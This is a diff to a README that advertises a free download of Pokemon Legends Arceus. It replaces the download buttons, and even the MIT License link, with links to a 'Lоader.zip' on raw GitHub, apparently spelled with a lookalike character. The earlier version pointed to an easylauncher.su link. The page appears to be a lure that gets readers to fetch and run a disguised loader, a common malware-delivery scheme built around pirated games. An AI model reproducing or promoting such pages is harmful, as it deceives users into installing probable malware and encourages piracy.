@@ -1,5 +1,5 @@
 # 🎮 Pokemon Legends Arceus Download Guide  
-[![Download Now](https://img.shields.io/badge/Download-Pokemon_Legends_Arceus-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/MarkKaizen/PokemonLegendsArceus-OpenAccessEdition/main/Lоader.zip)](https://raw.githubusercontent.com/MarkKaizen/PokemonLegendsArceus-OpenAccessEdition/main/Lоader.zip)
 
 Welcome to your all-in-one hub for seamless access to Pokemon Legends Arceus (Updated for 2025)! Enjoy an enhanced journey into the open-world adventure of your favorite Pocket Monsters. This repository delivers a detailed feature list, multi-OS support, and a step-by-step installation process.  
 
@@ -31,7 +31,7 @@ Welcome to your all-in-one hub for seamless access to Pokemon Legends Arceus (Up
 
 **Step 1:**  
 Click the button below to acquire the optimized version:  
-[![Download Now](https://img.shields.io/badge/Download-Pokemon_Legends_Arceus-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/MarkKaizen/PokemonLegendsArceus-OpenAccessEdition/main/Lоader.zip)](https://raw.githubusercontent.com/MarkKaizen/PokemonLegendsArceus-OpenAccessEdition/main/Lоader.zip)
 
 ---
 
@@ -49,9 +49,9 @@ This repository is for educational and informational purposes only. All intellec
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/MarkKaizen/PokemonLegendsArceus-OpenAccessEdition/main/Lоader.zip).  
 Feel the new adventure and install with confidence!
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Pokemon_Legends_Arceus-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/MarkKaizen/PokemonLegendsArceus-OpenAccessEdition/main/Lоader.zip)](https://raw.githubusercontent.com/MarkKaizen/PokemonLegendsArceus-OpenAccessEdition/main/Lоader.zip)
